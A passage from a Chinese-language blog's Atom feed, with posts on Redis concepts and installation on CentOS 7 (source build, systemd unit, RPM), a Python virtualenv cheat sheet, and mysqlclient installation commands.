Server&#xFF09;&#x8FDC;&#x7A0B;&#x5B57;&#x5178;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;&#x5B57;&#x5178;&#x670D;&#x52A1;&#x5668;&#x4ECE;&#x672C;&#x8D28;&#x4E0A;&#x6765;&#x8BB2;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x63D0;&#x4F9B;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x7684;&#x8FDC;&#x7A0B;&#x5B58;&#x50A8;&#x529F;&#x80FD;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;Redis&#x662F;&#x4E00;&#x4E2A;&#x9AD8;&#x7EA7;&#x7684;K-V&#x5B58;&#x50A8;&#xFF0C;&#x548C;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x5B58;&#x50A8;&#xFF0C;&#x56E0;&#x4E3A;Redis&#x9664;&#x4E86;&#x80FD;&#x591F;&#x5B58;&#x50A8;K-V&#x8FD9;&#x79CD;&#x7B80;&#x5355;&#x7684;&#x6570;&#x636E;&#x4E4B;&#x5916;&#xFF0C;&#x8FD8;&#x80FD;&#x591F;&#x5B58;&#x50A8;&#x5217;&#x8868;&#x3001;&#x5B57;&#x5178;&#x3001;hash&#x8868;&#x7B49;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x3002;</p><p>&#x5728;&#x6027;&#x80FD;&#x4E0A;Redis&#x4E0D;&#x6BD4;memcache&#x5DEE;&#xFF0C;&#x56E0;&#x4E3A;redis&#x6574;&#x4E2A;&#x8FD0;&#x884C;&#x901A;&#x901A;&#x90FD;&#x662F;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x5B83;&#x7684;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x96C6;&#x90FD;&#x662F;&#x4FDD;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#xFF0C;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4F1A;&#x5468;&#x671F;&#x6027;&#x7684;&#x5199;&#x5165;&#x5230;&#x78C1;&#x76D8;&#x4E0A;&#xFF0C;&#x4EE5;&#x5B9E;&#x73B0;&#x6570;&#x636E;&#x7684;&#x6301;&#x4E45;&#x529F;&#x80FD;&#xFF0C;&#x800C;&#x8FD9;&#x79CD;&#x5199;&#x78C1;&#x76D8;&#x5E76;&#x4E0D;&#x662F;&#x7528;&#x4E8E;&#x8BBF;&#x95EE;&#xFF0C;&#x800C;&#x4EC5;&#x662F;&#x5197;&#x4F59;&#x529F;&#x80FD;&#xFF0C;&#x6240;&#x4EE5;redis&#x6240;&#x6709;&#x529F;&#x80FD;&#x90FD;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x5B8C;&#x6210;&#xFF0C;&#x56E0;&#x4E3A;&#x6B64;&#x6027;&#x80FD;&#x4E5F;&#x662F;&#x53EF;&#x60F3;&#x800C;&#x77E5;&#x3002;</p><p>redis&#x4E0E;mamcache&#x4E0D;&#x540C;&#x4E4B;&#x5904;&#x5728;&#x4E8E;redis&#x6709;&#x4E00;&#x4E2A;&#x5468;&#x671F;&#x6027;&#x7684;&#x5C06;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x5230;&#x78C1;&#x76D8;&#x4E0A;&#x7684;&#x673A;&#x5236;&#xFF0C;&#x800C;&#x4E14;&#x4E0D;&#x53EA;&#x4E00;&#x79CD;&#xFF0C;&#x6709;&#x4E24;&#x79CD;&#x673A;&#x5236;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F;redis&#x6301;&#x4E45;&#x5316;&#x7684;&#x4E00;&#x79CD;&#x5B9E;&#x73B0;&#xFF0C;<strong>&#x53E6;&#x5916;&#x4E0E;memcache&#x6709;&#x6240;&#x533A;&#x522B;&#x7684;&#x662F;&#xFF0C;redis&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x54CD;&#x5E94;&#x6240;&#x6709;&#x7684;&#x8BF7;&#x6C42;</strong><br>redis&#x652F;&#x6301;&#x4E3B;&#x4ECE;&#x6A21;&#x5F0F;&#xFF0C;&#x4F46;&#x662F;redis&#x7684;&#x4E3B;&#x4ECE;&#x6A21;&#x5F0F;&#x9ED8;&#x8BA4;&#x5C31;&#x6709;&#x4E00;&#x4E2A;sentinel&#x5DE5;&#x5177;&#xFF0C;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;redis&#x80FD;&#x591F;&#x501F;&#x52A9;&#x4E8E;sentinel&#x5DE5;&#x5177;&#x6765;&#x76D1;&#x63A7;&#x4E3B;&#x4ECE;&#x8282;&#x70B9;&#xFF0C;&#x5F53;&#x4E3B;&#x8282;&#x70B9;&#x53D1;&#x751F;&#x6545;&#x969C;&#x65F6;&#xFF0C;&#x4F1A;&#x81EA;&#x5DF1;&#x63D0;&#x5347;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x4ECE;&#x8282;&#x70B9;&#x6210;&#x4E3A;&#x65B0;&#x7684;&#x4E3B;&#x8282;&#x70B9;</p><p>&#x5728;redis 3.0&#x7248;&#x672C;&#x53D1;&#x5E03;&#xFF0C;&#x5F00;&#x59CB;&#x652F;&#x6301;redis&#x96C6;&#x7FA4;&#xFF0C;&#x4ECE;&#x800C;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;&#x7528;&#x6237;&#x7684;&#x8BF7;&#x6C42;&#x5206;&#x6563;&#x81F3;&#x591A;&#x4E2A;&#x4E0D;&#x540C;&#x8282;&#x70B9;</p><h2 id="Redis&#x6240;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;"><a href="#Redis&#x6240;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;" class="headerlink" title="Redis&#x6240;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;"></a>Redis&#x6240;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;</h2><p>&#x652F;&#x6301;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x6709;&#x3001;String&#xFF08;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5305;&#x542B;&#x6574;&#x6570;&#xFF09;, List&#xFF08;&#x5217;&#x8868;&#xFF09;, Hash&#xFF08;&#x5173;&#x8054;&#x6570;&#x7EC4;&#xFF09;, Sets&#xFF08;&#x96C6;&#x5408;&#xFF09;, Sorted Sets&#xFF08;&#x6709;&#x5E8F;&#x96C6;&#x5408;&#xFF09;, Bitmaps&#xFF08;&#x4F4D;&#x56FE;&#xFF09;, HyperLoglog </p><h2 id="Redis&#x6027;&#x80FD;&#x8BC4;&#x4F30;"><a href="#Redis&#x6027;&#x80FD;&#x8BC4;&#x4F30;" class="headerlink" title="Redis&#x6027;&#x80FD;&#x8BC4;&#x4F30;"></a>Redis&#x6027;&#x80FD;&#x8BC4;&#x4F30;</h2><p>1&#x3001;100&#x4E07;&#x8F83;&#x5C0F;&#x7684;&#x952E;&#x5B58;&#x50A8;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5927;&#x6982;&#x6D88;&#x8017;100M&#x5185;&#x5B58;</p><p>2&#x3001;&#x7531;&#x4E8E;redis&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#xFF0C;&#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x4E3B;&#x673A;&#x4E0A;&#x6709;&#x591A;&#x4E2A;CPU&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x80FD;&#x591F;&#x4F7F;&#x7528;&#xFF0C;&#x4F46;&#x5E76;&#x4E0D;&#x610F;&#x5473;&#x7740;CPU&#x4F1A;&#x6210;&#x4E3A;&#x74F6;&#x9888;&#xFF0C;&#x56E0;&#x4E3A;redis&#x662F;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;K-V&#x6570;&#x636E;&#x5B58;&#x50A8;&#xFF0C;CPU&#x901A;&#x5E38;&#x4E0D;&#x4F1A;&#x6210;&#x4E3A;&#x74F6;&#x9888;&#x7684;</p><p>3&#x3001;&#x5728;&#x5E38;&#x89C1;&#x7684;linux&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;500K&#xFF08;50&#x4E07;&#xFF09;&#x7684;&#x5E76;&#x53D1;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x4E00;&#x79D2;&#x949F;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x679C;&#x4E3B;&#x673A;&#x786C;&#x4EF6;&#x8F83;&#x597D;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6BCF;&#x79D2;&#x949F;&#x53EF;&#x4EE5;&#x8FBE;&#x5230;&#x4E0A;&#x767E;&#x4E07;&#x7684;&#x5E76;&#x53D1;</p><h2 id="Redis&#x4E0E;memcache&#x5BF9;&#x6BD4;&#xFF1A;"><a href="#Redis&#x4E0E;memcache&#x5BF9;&#x6BD4;&#xFF1A;" class="headerlink" title="Redis&#x4E0E;memcache&#x5BF9;&#x6BD4;&#xFF1A;"></a>Redis&#x4E0E;memcache&#x5BF9;&#x6BD4;&#xFF1A;</h2><ul><li>Memcache&#x662F;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x5185;&#x5B58;&#x5BF9;&#x8C61;&#x7F13;&#x5B58;&#x7CFB;&#x7EDF;</li><li>&#x800C;redis&#x662F;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x6301;&#x4E45;&#x5B58;&#x50A8;</li><li>Memcache&#x662F;&#x4E00;&#x4E2A;LRU&#x7684;&#x7F13;&#x5B58;</li><li>redis&#x652F;&#x6301;&#x66F4;&#x591A;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;</li><li>Memcache&#x662F;&#x591A;&#x7EBF;&#x7A0B;&#x7684;</li><li>redis&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x7684;</li><li>&#x4E8C;&#x8005;&#x6027;&#x80FD;&#x51E0;&#x4E4E;&#x4E0D;&#x76F8;&#x4E0A;&#x4E0B;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;redis&#x4F1A;&#x53D7;&#x5230;&#x786C;&#x76D8;&#x6301;&#x4E45;&#x5316;&#x7684;&#x5F71;&#x54CD;&#xFF0C;&#x4F46;&#x662F;&#x6027;&#x80FD;&#x4ECD;&#x7136;&#x4FDD;&#x6301;&#x5728;&#x4E0E;Memcache&#x4E0D;&#x76F8;&#x4E0A;&#x4E0B;&#xFF0C;&#x662F;&#x975E;&#x5E38;&#x4E86;&#x4E0D;&#x8D77;&#x7684;</li></ul><h2 id="Redis&#x7684;&#x4F18;&#x52BF;"><a href="#Redis&#x7684;&#x4F18;&#x52BF;" class="headerlink" title="Redis&#x7684;&#x4F18;&#x52BF;"></a>Redis&#x7684;&#x4F18;&#x52BF;</h2><ul><li><p>&#x4E30;&#x5BCC;&#x7684;&#xFF08;&#x8D44;&#x6599;&#x5F62;&#x6001;&#xFF09;&#x64CD;&#x4F5C;<br>string&#xFF08;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5305;&#x542B;&#x6574;&#x6570;&#xFF09;, List&#xFF08;&#x5217;&#x8868;&#xFF09;, Hash&#xFF08;&#x5173;&#x8054;&#x6570;&#x7EC4;&#xFF09;, Sets&#xFF08;&#x96C6;&#x5408;&#xFF09;, Sorted Sets&#xFF08;&#x6709;&#x5E8F;&#x96C6;&#x5408;&#xFF09;, Bitmaps&#xFF08;&#x4F4D;&#x56FE;&#xFF09;, HyperLoglog</p></li><li><p>&#x5185;&#x5EFA;Replication&#x548C;culster&#xFF08;&#x81EA;&#x8EAB;&#x652F;&#x6301;&#x590D;&#x5236;&#x53CA;&#x96C6;&#x7FA4;&#x529F;&#x80FD;&#xFF09;  </p></li><li>&#x652F;&#x6301;&#x5C31;&#x5730;&#x66F4;&#x65B0;&#xFF08;in-place update&#xFF09;&#x64CD;&#x4F5C;&#xFF0C;&#x76F4;&#x63A5;&#x53EF;&#x4EE5;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x5B8C;&#x6210;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;  </li><li>&#x652F;&#x6301;&#x6301;&#x4E45;&#x5316;&#xFF08;&#x78C1;&#x76D8;&#xFF09;<br>&#x907F;&#x514D;&#x96EA;&#x5D29;&#x6548;&#x5E94;&#xFF0C;&#x4E07;&#x4E00;&#x51FA;&#x73B0;&#x96EA;&#x5D29;&#x6548;&#x5E94;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x90FD;&#x65E0;&#x6CD5;&#x6062;&#x590D;&#xFF0C;&#x4F46;redis&#x7531;&#x4E8E;&#x6709;&#x6301;&#x4E45;&#x6027;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x6062;&#x590D;</li></ul><h2 id="Memcached&#x7684;&#x4F18;&#x52BF;"><a href="#Memcached&#x7684;&#x4F18;&#x52BF;" class="headerlink" title="Memcached&#x7684;&#x4F18;&#x52BF;"></a>Memcached&#x7684;&#x4F18;&#x52BF;</h2><ul><li>&#x591A;&#x7EBF;&#x7A0B;</li><li>&#x5584;&#x7528;&#x591A;&#x6838;CPU</li><li>&#x66F4;&#x5C11;&#x7684;&#x963B;&#x585E;&#x64CD;&#x4F5C;</li><li>&#x66F4;&#x5C11;&#x7684;&#x5185;&#x5B58;&#x5F00;&#x9500;</li><li>&#x66F4;&#x5C11;&#x7684;&#x5185;&#x5B58;&#x5206;&#x914D;&#x538B;&#x529B;</li><li>&#x53EF;&#x80FD;&#x6709;&#x66F4;&#x5C11;&#x7684;&#x5185;&#x5B58;&#x788E;&#x7247;</li></ul><h1 id="&#x5B89;&#x88C5;Redis"><a href="#&#x5B89;&#x88C5;Redis" class="headerlink" title="&#x5B89;&#x88C5;Redis"></a>&#x5B89;&#x88C5;Redis</h1><p><a href="https://redis.io" target="_blank" rel="noopener">https://redis.io</a>  &#x5B98;&#x7F51;<br><a href="https://download.redis.io/releases/" target="_blank" rel="noopener">https://download.redis.io/releases/</a>  &#x4E0B;&#x8F7D;&#x5730;&#x5740;</p><h2 id="&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;"><a href="#&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;" class="headerlink" title="&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;"></a>&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;</h2><p><strong>&#x83B7;&#x53D6;&#x6E90;&#x7801;&#x5305;</strong></p><pre><code class="shell">[root@ctos7mini ~]&amp; wget https://download.redis.io/releases/redis-3.2.5.tar.gz--2022-05-09 04:27:32--  https://download.redis.io/releases/redis-3.2.5.tar.gzConnecting to 192.168.73.1:7890... connected.Proxy request sent, awaiting response... 200 OKLength: 1544040 (1.5M) [application/octet-stream]Saving to: &#x2018;redis-3.2.5.tar.gz&#x2019;100%[==================================================================================================================&gt;] 1,544,040   1.10MB/s   in 1.3s2022-05-09 04:27:35 (1.10 MB/s) - &#x2018;redis-3.2.5.tar.gz&#x2019; saved [1544040/1544040]</code></pre><p><strong>&#x89E3;&#x538B;&#x6587;&#x4EF6;&#x5230;<code>/usr/local/</code></strong></p><pre><code class="shell">[root@ctos7mini ~]&amp; tar zxvf redis-3.2.5.tar.gz -C /usr/local/redis-3.2.5/redis-3.2.5/.gitignoreredis-3.2.5/00-RELEASENOTESredis-3.2.5/BUGSredis-3.2.5/CONTRIBUTINGredis-3.2.5/COPYINGredis-3.2.5/INSTALLredis-3.2.5/MANIFESTOredis-3.2.5/Makefileredis-3.2.5/README.mdredis-3.2.5/deps/redis-3.2.5/deps/Makefileredis-3.2.5/deps/README.mdredis-3.2.5/deps/geohash-int/redis-3.2.5/deps/geohash-int/Makefileredis-3.2.5/deps/geohash-int/geohash.credis-3.2.5/deps/geohash-int/geohash.hredis-3.2.5/deps/geohash-int/geohash_helper.c..................&#x7701;&#x7565;..........................</code></pre><p><strong>&#x5B89;&#x88C5;&#x7F16;&#x8BD1;&#x73AF;&#x5883;</strong></p><pre><code class="shell">[root@ctos7mini redis-3.2.5]&amp; yum install -y gcc gcc-c++ kernel-devel</code></pre><p><strong>&#x7F16;&#x8BD1;Redis</strong></p><pre><code class="shell">[root@ctos7mini src]&amp; make &amp;&amp; make install</code></pre><p><strong>&#x521B;&#x5EFA;redis.service&#x542F;&#x52A8;&#x6587;&#x4EF6;</strong></p><pre><code class="shell">[root@ctos7mini ~]&amp; vim /usr/lib/systemd/system/redis.service</code></pre><pre><code class="ini">[Unit]Description=Redis persistent key-value databaseAfter=network.target[Service]ExecStart=/usr/local/redis-3.2.5/src/redis-server /usr/local/redis-3.2.5/redis.conf --supervised systemdExecStop=/usr/libexec/redis-shutdownType=notifyUser=redisGroup=redisRuntimeDirectory=redisRuntimeDirectoryMode=0755[Install]WantedBy=multi-user.target</code></pre><p>&#x521B;&#x5EFA;redis-shutdown&#x6587;&#x4EF6;</p><pre><code class="shell">[root@ctos7mini src]&amp; vim /usr/libexec/redis-shutdown##=========================================================###!/bin/bash## Wrapper to close properly redis and sentineltest x&quot;$REDIS_DEBUG&quot; != x &amp;&amp; set -xREDIS_CLI=/usr/local/redis-3.2.5/src/redis-cli# Retrieve service nameSERVICE_NAME=&quot;$1&quot;if [ -z &quot;$SERVICE_NAME&quot; ]; then   SERVICE_NAME=redisfi# Get the proper config file based on service nameCONFIG_FILE=&quot;/etc/$SERVICE_NAME.conf&quot;# Use awk to retrieve host, port from config fileHOST=`awk &apos;/^[[:blank:]]*bind/ { print $2 }&apos; $CONFIG_FILE | tail -n1`PORT=`awk &apos;/^[[:blank:]]*port/ { print $2 }&apos; $CONFIG_FILE | tail -n1`PASS=`awk &apos;/^[[:blank:]]*requirepass/ { print $2 }&apos; $CONFIG_FILE | tail -n1`SOCK=`awk &apos;/^[[:blank:]]*unixsocket\s/ { print $2 }&apos; $CONFIG_FILE | tail -n1`# Just in case, use default host, portHOST=${HOST:-127.0.0.1}if [ &quot;$SERVICE_NAME&quot; = redis ]; then    PORT=${PORT:-6379}else    PORT=${PORT:-26739}fi# Setup additional parameters# e.g password-protected redis instances[ -z &quot;$PASS&quot;  ] || ADDITIONAL_PARAMS=&quot;-a $PASS&quot;# shutdown the service properlyif [ -e &quot;$SOCK&quot; ] ; then    $REDIS_CLI -s $SOCK $ADDITIONAL_PARAMS shutdownelse    $REDIS_CLI -h $HOST -p $PORT $ADDITIONAL_PARAMS shutdownfi##=========================================================##[root@ctos7mini src]&amp; chmod 755 /usr/libexec/redis-shutdown</code></pre><pre><code class="shell">[root@ctos7mini ~]&amp; useradd redis -s /sbin/nologin[root@ctos7mini ~]&amp; systemctl daemon-reload[root@ctos7mini ~]&amp; systemctl start redis[root@ctos7mini ~]&amp; netstat -pantul | grep 6379tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      1282/redis-server *tcp6       0      0 :::6379                 :::*                    LISTEN      1282/redis-server *[root@ctos7mini ~]&amp;</code></pre><pre><code class="mbox">[root@ctos7mini ~]&amp; redis-server &amp;[1] 1282[root@ctos7mini ~]&amp; 1282:C 09 May 04:53:34.532 # Warning: no config file specified, using the default config. In order to specify a config file use redis-server /path/to/redis.conf1282:M 09 May 04:53:34.533 * Increased maximum number of open files to 10032 (it was originally set to 1024).                _._           _.-``__ &apos;&apos;-._      _.-``    `.  `_.  &apos;&apos;-._           Redis 3.2.5 (00000000/0) 64 bit  .-`` .-```.  ```\/    _.,_ &apos;&apos;-._ (    &apos;      ,       .-`  | `,    )     Running in standalone mode |`-._`-...-` __...-.``-._|&apos;` _.-&apos;|     Port: 6379 |    `-._   `._    /     _.-&apos;    |     PID: 1282  `-._    `-._  `-./  _.-&apos;    _.-&apos; |`-._`-._    `-.__.-&apos;    _.-&apos;_.-&apos;| |    `-._`-._        _.-&apos;_.-&apos;    |           http://redis.io  `-._    `-._`-.__.-&apos;_.-&apos;    _.-&apos; |`-._`-._    `-.__.-&apos;    _.-&apos;_.-&apos;| |    `-._`-._        _.-&apos;_.-&apos;    |  `-._    `-._`-.__.-&apos;_.-&apos;    _.-&apos;      `-._    `-.__.-&apos;    _.-&apos;          `-._        _.-&apos;              `-.__.-&apos;1282:M 09 May 04:53:34.540 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.1282:M 09 May 04:53:34.540 # Server started, Redis version 3.2.51282:M 09 May 04:53:34.541 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add &apos;vm.overcommit_memory = 1&apos; to /etc/sysctl.conf and then reboot or run the command &apos;sysctl vm.overcommit_memory=1&apos; for this to take effect.1282:M 09 May 04:53:34.541 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command &apos;echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled&apos; as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.1282:M 09 May 04:53:34.541 * DB loaded from disk: 0.000 seconds1282:M 09 May 04:53:34.541 * The server is now ready to accept connections on port 6379[root@ctos7mini ~]&amp;</code></pre><pre><code class="mbox">[root@ctos7mini ~]&amp; redis-cli127.0.0.1:6379&gt;</code></pre><h2 id="rpm&#x5B89;&#x88C5;Redis"><a href="#rpm&#x5B89;&#x88C5;Redis" class="headerlink" title="rpm&#x5B89;&#x88C5;Redis"></a>rpm&#x5B89;&#x88C5;Redis</h2><pre><code class="shell">[root@ctos7mini ~]&amp; yum install https://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/r/redis-3.2.12-2.el7.x86_64.rpmLoaded plugins: fastestmirrorredis-3.2.12-2.el7.x86_64.rpm                                                                                                                        | 544 kB  00:00:01Examining /var/tmp/yum-root-OuFo3f/redis-3.2.12-2.el7.x86_64.rpm: redis-3.2.12-2.el7.x86_64Marking /var/tmp/yum-root-OuFo3f/redis-3.2.12-2.el7.x86_64.rpm to be installedResolving Dependencies--&gt; Running transaction check---&gt; Package redis.x86_64 0:3.2.12-2.el7 will be installed--&gt; Processing Dependency: libjemalloc.so.1()(64bit) for package: redis-3.2.12-2.el7.x86_64Loading mirror speeds from cached hostfile * base: centos.nethub.com.hk * epel: mirrors.neusoft.edu.cn * extras: centos.nethub.com.hk * updates: centos.nethub.com.hk--&gt; Running transaction check---&gt; Package jemalloc.x86_64 0:3.6.0-1.el7 will be installed--&gt; Finished Dependency ResolutionDependencies Resolved============================================================================================================================================================================ Package                             Arch                              Version                                  Repository                                             Size============================================================================================================================================================================Installing: redis                               x86_64                            3.2.12-2.el7                             /redis-3.2.12-2.el7.x86_64                            1.4 MInstalling for dependencies: jemalloc                            x86_64                            3.6.0-1.el7                              epel                                                  105 kTransaction Summary============================================================================================================================================================================Install  1 Package (+1 Dependent package)Total size: 1.5 MTotal download size: 105 kInstalled size: 1.7 MIs this ok [y/d/N]: yDownloading packages:jemalloc-3.6.0-1.el7.x86_64.rpm                                                                                                                      | 105 kB  00:00:00Running transaction checkRunning transaction testTransaction test succeededRunning transaction  Installing : jemalloc-3.6.0-1.el7.x86_64                                                                                                                              1/2  Installing : redis-3.2.12-2.el7.x86_64                                                                                                                                2/2  Verifying  : redis-3.2.12-2.el7.x86_64                                                                                                                                1/2  Verifying  : jemalloc-3.6.0-1.el7.x86_64                                                                                                                              2/2Installed:  redis.x86_64 0:3.2.12-2.el7Dependency Installed:  jemalloc.x86_64 0:3.6.0-1.el7Complete![root@ctos7mini ~]&amp; systemctl start redis[root@ctos7mini ~]&amp;</code></pre><p><img src="http://192.168.85.188:8081/uploads/1652923388117537180QQ20220508210823.png" alt=""><br>&#x6CE8;&#x610F;&#xFF1A;&#x4F7F;&#x7528;RPM&#x5305;&#x5B89;&#x88C5;redis&#x4F1A;&#x4F9D;&#x8D56;jemalloc&#x7A0B;&#x5E8F;&#x5305;&#xFF0C;jemalloc&#x662F;&#x5185;&#x5B58;&#x5206;&#x914D;&#x5DE5;&#x5177;&#xFF0C;&#x6B64;&#x5305;&#x5728;epel&#x6E90;&#x4E2D;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis&amp;#x6982;&amp;#x8FF0;&quot;&gt;&lt;a href=&quot;#Redis&amp;#x6982;&amp;#x8FF0;&quot; class=&quot;headerlink&quot; title=&quot;Redis&amp;#x6982;&amp;#x8FF0;&quot;&gt;&lt;/a&gt;Redis&amp;#x6982;&amp;#x8FF0;&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python-VirtualEnv</title>
    <link href="https://marnm.github.io//posts/1f351894/"/>
    <id>https://marnm.github.io//posts/1f351894/</id>
    <published>2022-06-07T04:48:42.000Z</published>
    <updated>2022-06-07T05:07:57.325Z</updated>
    
    <content type="html"><![CDATA[<p><strong>&#x521B;&#x5EFA;&#x865A;&#x62DF;&#x73AF;&#x5883;</strong></p><pre><code>virtualenv venv_dir</code></pre><p><strong>&#x6307;&#x5B9A;&#x7248;&#x672C;</strong></p><pre><code>virtualenv venv_dir --python=python3.7</code></pre><p><strong>&#x6FC0;&#x6D3B;&#x865A;&#x62DF;&#x73AF;&#x5883;</strong><br>Windows:</p><pre><code>venv_dir\Scripts\activate</code></pre><p>Linux:</p><pre><code>source venv_dir\bin\activate</code></pre><p><strong>&#x9000;&#x51FA;&#x865A;&#x62DF;&#x73AF;&#x5883;</strong></p><pre><code>deactivate</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&amp;#x521B;&amp;#x5EFA;&amp;#x865A;&amp;#x62DF;&amp;#x73AF;&amp;#x5883;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;virtualenv venv_dir
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;&amp;#x6307;&amp;#x5
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mysqlclient无法安装的问题</title>
    <link href="https://marnm.github.io//posts/3e189d0c/"/>
    <id>https://marnm.github.io//posts/3e189d0c/</id>
    <published>2022-06-07T04:48:28.000Z</published>
    <updated>2022-06-07T05:08:18.494Z</updated>
    
    <content type="html"><![CDATA[<pre><code class="shell">sudo apt install -y mysql-client #&#x57FA;&#x4E8E;python&#x5B89;&#x88C5;mysqlclient&#x9700;&#x8981;&#x4F9D;&#x6B21;&#x5B89;&#x88C5;&#x4EE5;&#x4E0B;&#x5E93;: sudo apt-get install libmysqlclient-dev sudo apt install libssl-dev sudo apt install libcrypto++-dev sudo pip3 install mysqlclient # &#x6700;&#x540E;&#x8FD9;&#x9879;&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x865A;&#x62DF;&#x73AF;&#x5883;&#x4E2D;&#x5B89;&#x88C5; pip install mysqlclient</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;

sudo apt install -y mysql-client 

#&amp;#x57FA;&amp;#x4E8E;python&amp;#x5B89;&amp;#x88C5;mysqlclient&amp;#x9700;&amp;#x8981;&amp;#x4F9D;&amp;#x6
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Django教程</title>
    <link href="https://marnm.github.io//posts/5e357037/"/>
    <id>https://marnm.github.io//posts/5e357037/</id>
    <published>2022-06-07T04:48:14.000Z</published>
    <updated>2022-09-02T19:17:23.523Z</updated>
    
